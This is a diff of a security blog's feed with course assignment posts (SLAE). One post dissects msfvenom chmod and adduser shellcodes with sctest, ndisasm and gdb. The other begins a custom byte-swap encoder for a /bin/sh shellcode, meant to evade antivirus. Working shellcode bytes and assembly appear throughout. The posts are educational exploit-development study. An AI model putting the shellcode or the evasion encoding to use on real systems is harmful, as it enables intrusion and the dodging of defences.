+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ERROR&lt;/span&gt;  &lt;span class="nf"&gt;chmod&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
 &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;ERROR&lt;/span&gt;  &lt;span class="n"&gt;exit&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
      &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4288522&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -1121,14 +1121,14 @@ LPORT  4444             yes       The listen port
 
 
 &lt;p&gt;Looking at it I could tell that the shellcode probably called the &lt;code&gt;chmod()&lt;/code&gt; and &lt;code&gt;exit()&lt;/code&gt; functions, but what parameters were passed to &lt;code&gt;chmod()&lt;/code&gt; was not clear. Let's take a look at the graph converted from dot to png file format:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;dot -Tpng -o tmp.png tmp.dot &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; eog tmp.png
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dot -Tpng -o tmp.png tmp.dot &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; eog tmp.png
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Chmod shellcode call graph" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph" /&gt;
+&lt;p&gt;&lt;img alt="Chmod shellcode call graph" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph"&gt;
 &lt;div class="img-caption"&gt;Chmod shellcode call graph&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;On the call graph we can again see that &lt;code&gt;sctest&lt;/code&gt; definitely caught calls to the &lt;code&gt;chmod()&lt;/code&gt; and &lt;code&gt;exit()&lt;/code&gt; functions. We can also see that the second argument (ECX register) to the &lt;code&gt;chmod&lt;/code&gt; system call is set to &lt;em&gt;0x1b6&lt;/em&gt;, which, as we can confirm on Linux command line with &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;%o\n&amp;quot;&lt;/span&gt; 0x1b6 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;%o\n&amp;quot;&lt;/span&gt; 0x1b6 
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1138,17 +1138,17 @@ LPORT  4444             yes       The listen port
 &lt;h1&gt;Example #3: Adduser&lt;/h1&gt;
 &lt;p&gt;In this example I want to zero in on the case where the &lt;code&gt;sctest&lt;/code&gt; is mostly useless and some interaction with &lt;code&gt;gdb&lt;/code&gt; is needed to fully see the shellcode through.&lt;/p&gt;
 &lt;p&gt;After running the following command, you will see that &lt;code&gt;sctest&lt;/code&gt; was not able to generate a high view of the shellcode logic and even the tmp.dot call graph is empty:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/adduser -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Let's try a different approach and disassemble the shellcode with &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f raw &amp;gt; tmp.bin &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ndisasm -b32 tmp.bin
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/adduser -f raw &amp;gt; tmp.bin &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ndisasm -b32 tmp.bin
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Below is the output of the above command with my comments. I truncated the "gibberish" part to save some space.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;00000000&lt;/span&gt;  &lt;span class="err"&gt;31&lt;/span&gt;&lt;span class="nf"&gt;C9&lt;/span&gt;              &lt;span class="nv"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;zero&lt;/span&gt; &lt;span class="nv"&gt;out&lt;/span&gt; &lt;span class="nb"&gt;ECX&lt;/span&gt; &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;EBX&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;00000000&lt;/span&gt;  &lt;span class="err"&gt;31&lt;/span&gt;&lt;span class="nf"&gt;C9&lt;/span&gt;              &lt;span class="nv"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;zero&lt;/span&gt; &lt;span class="nv"&gt;out&lt;/span&gt; &lt;span class="nb"&gt;ECX&lt;/span&gt; &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;EBX&lt;/span&gt;
 &lt;span class="err"&gt;00000002&lt;/span&gt;  &lt;span class="err"&gt;89&lt;/span&gt;&lt;span class="nf"&gt;CB&lt;/span&gt;              &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt;
 &lt;span class="err"&gt;00000004&lt;/span&gt;  &lt;span class="err"&gt;6&lt;/span&gt;&lt;span class="nf"&gt;A46&lt;/span&gt;              &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x46&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;load&lt;/span&gt; &lt;span class="nb"&gt;EAX&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;corresponding&lt;/span&gt;
 &lt;span class="err"&gt;00000006&lt;/span&gt;  &lt;span class="err"&gt;58&lt;/span&gt;                &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;     &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;setreuid&lt;/span&gt; &lt;span class="nv"&gt;syscall&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;
@@ -1194,12 +1194,12 @@ LPORT  4444             yes       The listen port
 &lt;p&gt;Now, the interesting part. Note that the call instruction jumps to the 0x53 address. But then there are no separate instructions at that address. There is an instruction at the address 0x52 and then at 0x55. This fact indicates that in the "gibberish" part of the code some incorrect sequence of bytes confused the disassembler and the bytes-to-opcodes translation went off. &lt;/p&gt;
 &lt;p&gt;Note the sequence of bytes at the 0x52 address - 0A598B. The 53rd byte, where the &lt;code&gt;call&lt;/code&gt; instruction jumps is 59. I will regenerate payload in the C format, take the part starting from 53rd byte, and disassemble it to get the correct bytes-to-opcodes translation. For that I will use the &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;scdisas&lt;/a&gt; script, which I created while going through the SLAE course materials.&lt;/p&gt;
 &lt;p&gt;Producing shellcode in the format ready to be pasted into a C program:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f c
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/adduser -f c
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output (truncated):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;...
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
 &amp;quot;\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51&amp;quot;
 &amp;quot;\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63&amp;quot;
 &amp;quot;\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65&amp;quot;
@@ -1211,12 +1211,12 @@ LPORT  4444             yes       The listen port
 
 
 &lt;p&gt;Disassembling of the shellcode starting from 52nd byte:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;scdisas &lt;span class="s2"&gt;&amp;quot;\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;scdisas &lt;span class="s2"&gt;&amp;quot;\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;00000000  59                pop ecx
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;00000000  59                pop ecx
 00000001  8B51FC            mov edx,[ecx-0x4]
 00000004  6A04              push byte +0x4
 00000006  58                pop eax
@@ -1229,36 +1229,36 @@ LPORT  4444             yes       The listen port
 
 &lt;p&gt;In the above output you can see that the instruction where call passes execution flow is a pop instruction. That means that the shellcode employed the variation of jmp-call-pop technique, as encountered in the previous example. So, what I called "gibberish" is actually some kind of data, most likely a string, address to which gets loaded into ECX register. By now we already know what string it is, but just to make sure, let's take a look at it in &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;To run the shellcode in &lt;code&gt;gdb&lt;/code&gt; I'll save it in the ELF format. The ELF format that &lt;code&gt;msfvenom&lt;/code&gt; outputs runs without any problems, but the binary is stripped of all symbols, which means that we won't be able to set a breakpoint on the &lt;em&gt;_start&lt;/em&gt; or &lt;em&gt;main&lt;/em&gt; labels. To find the entry point we can use the &lt;code&gt;readelf&lt;/code&gt; utility. One of the lines from its output will point us to the address in question:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f elf &amp;gt; tmp.elf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p linux/x86/adduser -f elf &amp;gt; tmp.elf
 chmod +x tmp.elf
 readelf --headers tmp.elf
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;...
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
   Entry point address:               0x8048054
 ...
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Below is the command sequence that gets us started with gdb:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;gdb tmp.elf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gdb tmp.elf
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;break&lt;/span&gt; *0x8048054
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; run
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas &lt;span class="nv"&gt;$eip&lt;/span&gt;,+45
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Disassembly view in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb" /&gt;
+&lt;p&gt;&lt;img alt="Disassembly view in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb"&gt;
 &lt;div class="img-caption"&gt;Disassembly view in gdb&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;On the above picture you can see that the data starts at the address following the &lt;code&gt;call&lt;/code&gt; instruction which is 0x0804807f. And running either of the following two commands, we can be certain that the 40 bytes of the data represent the string that as we saw earlier written to the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/40cb 0x0804807f
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/40cb 0x0804807f
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/s 0x0804807f
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Checking string data in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb" /&gt;
+&lt;p&gt;&lt;img alt="Checking string data in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb"&gt;
 &lt;div class="img-caption"&gt;Checking string data in gdb&lt;/div&gt;&lt;/p&gt;
 &lt;div class="divider"&gt;&lt;/div&gt;
 
@@ -1270,12 +1270,12 @@ readelf --headers tmp.elf
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Custom encoding scheme in Assembly (SLAE, Assignment #4)</title><link href="http://www.wryway.com/blog/assembly-custom-encoding-scheme/" rel="alternate"></link><updated>2015-10-06T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-06:blog/assembly-custom-encoding-scheme/</id><summary type="html">&lt;p&gt;The &lt;em&gt;encoding&lt;/em&gt; and &lt;em&gt;encryption&lt;/em&gt; notions are sometimes used interchangeably to describe a process of data transformation, while, in fact, &lt;a href="https://danielmiessler.com/study/encoding_encryption_hashing/"&gt;there is a difference&lt;/a&gt;. The purpose of encoding is to transform data so that it can be properly consumed by a different type of system. Encoding transforms data into another format using a scheme that is publicly available and does not require a key. The purpose of encryption, on the other hand, is to transform data to keep it secret from others, so it can only be consumed by the intended recipient. Encryption usually transforms (encrypts/decrypts) data using a secret key, and the algorithm may or may not be publicly available.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="Linux"></category></entry><entry><title>Custom encoding scheme in Assembly (SLAE, Assignment #4)</title><link href="http://www.wryway.com/blog/assembly-custom-encoding-scheme/" rel="alternate"></link><published>2015-10-06T20:00:00-04:00</published><updated>2015-10-06T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-06:/blog/assembly-custom-encoding-scheme/</id><summary type="html">&lt;p&gt;Custom shellcode encoding schemes to evade AV&lt;/p&gt;</summary><content type="html">&lt;p&gt;The &lt;em&gt;encoding&lt;/em&gt; and &lt;em&gt;encryption&lt;/em&gt; notions are sometimes used interchangeably to describe a process of data transformation, while, in fact, &lt;a href="https://danielmiessler.com/study/encoding_encryption_hashing/"&gt;there is a difference&lt;/a&gt;. The purpose of encoding is to transform data so that it can be properly consumed by a different type of system. Encoding transforms data into another format using a scheme that is publicly available and does not require a key. The purpose of encryption, on the other hand, is to transform data to keep it secret from others, so it can only be consumed by the intended recipient. Encryption usually transforms (encrypts/decrypts) data using a secret key, and the algorithm may or may not be publicly available.&lt;/p&gt;
 &lt;p&gt;I contemplated on what type of data transformation this post was going to tackle. Because there is no secret key involved and the shellcode is encrypted so it can be safely consumed by the decoding stub I decided that it would be proper to call it an encoding scheme.&lt;/p&gt;
 &lt;p&gt;The purpose of creating a custom encoding scheme in exploit development craft is to evade antiviruses and intrusion detection systems. When crafting one, keep in mind that its purpose is to fool, more often than not, signature-based software, not an intelligent live person who dedicated his life to breaking encryption algorithms. So it doesn't have to be too complicated.&lt;/p&gt;
 &lt;p&gt;To apply the encoding scheme to a shellcode one usually creates a separate encoder and a decoding stub, which becomes a part of a new shellcode and is used to decode the main encoded payload before transferring the execution flow to it.&lt;/p&gt;
 &lt;p&gt;Before describing the encoding scheme I came up with, let's first create a shellcode to work with. I will use the shell-starting shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
     &lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -1283,52 +1283,52 @@ This blog post was created to fulfill the requirements of the &lt;a href="http:/
     &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt; 
     &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x68732f6e&lt;/span&gt;
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x69622f2f&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;        &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;put&lt;/span&gt; &lt;span class="no"&gt;string&lt;/span&gt; &lt;span class="no"&gt;address&lt;/span&gt; &lt;span class="no"&gt;into&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;
-    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;        &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;args&lt;/span&gt;
-    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;        &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;env&lt;/span&gt; &lt;span class="no"&gt;vars&lt;/span&gt;
-    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;        &lt;span class="c"&gt;; put string address into ebx&lt;/span&gt;
+    &lt;span class="no"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;        &lt;span class="c"&gt;; args&lt;/span&gt;
+    &lt;span class="no"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;        &lt;span class="c"&gt;; env vars&lt;/span&gt;
+    &lt;span class="no"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
     &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt; 
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;div class="divider"&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf stacksh.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld stacksh.o -o stacksh &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./stacksh
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasm -f elf stacksh.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld stacksh.o -o stacksh &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./stacksh
 scdump stacksh
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output from the last command (formatted to fit the screen):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Length:  23
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Length:  23
 Payload: &amp;quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9&amp;quot;
 &amp;quot;\x31\xd2\xb0\x0b\xcd\x80&amp;quot;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The encoding scheme itself is super simple. It just exchanges position of two adjacent bytes. For it to work correctly, the shellcode length must be a multiple of 2. So, if it is not, the encoder appends a no-operation &lt;code&gt;\x90&lt;/code&gt; byte to satisfy the requirement. The encoder implementation in Python follows:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
 
-&lt;span class="c"&gt;# Author: Oleg Mitrofanov (reider-roque) 2015&lt;/span&gt;
+&lt;span class="c1"&gt;# Author: Oleg Mitrofanov (reider-roque) 2015&lt;/span&gt;
 
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os.path&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; 
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;x{:02x}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;x{:02x}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hexlify_nasm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; 
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0x{:02x},&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0x{:02x},&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;unhexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
